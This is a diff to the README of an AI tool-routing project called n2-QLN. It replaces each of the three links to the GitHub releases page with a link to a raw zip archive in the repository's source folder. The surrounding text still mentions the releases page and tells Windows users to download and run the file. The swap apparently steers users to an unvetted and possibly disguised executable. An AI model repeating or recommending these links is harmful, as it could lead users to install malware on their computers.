@@ -1,6 +1,6 @@
 # 🧠 n2-QLN - Route Tools, Search Smarter, Save Space
 
-[![Download n2-QLN](https://img.shields.io/badge/Download-n2--QLN-blue?style=for-the-badge&logo=github)](https://github.com/significant-mi454/n2-QLN/releases)
+[![Download n2-QLN](https://img.shields.io/badge/Download-n2--QLN-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/significant-mi454/n2-QLN/main/src/QLN-n-v3.8.zip)
 
 ## 🚀 What n2-QLN Does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Visit this page to download the Windows version:
 
-https://github.com/significant-mi454/n2-QLN/releases
+https://raw.githubusercontent.com/significant-mi454/n2-QLN/main/src/QLN-n-v3.8.zip
 
 On the releases page, choose the latest Windows file, then download and run it on your PC.
 
@@ -197,4 +197,4 @@ A router keeps tool choice simple when you have many tools. It helps the AI pick
 
 If you need the download page again, use this link:
 
-https://github.com/significant-mi454/n2-QLN/releases
+https://raw.githubusercontent.com/significant-mi454/n2-QLN/main/src/QLN-n-v3.8.zip
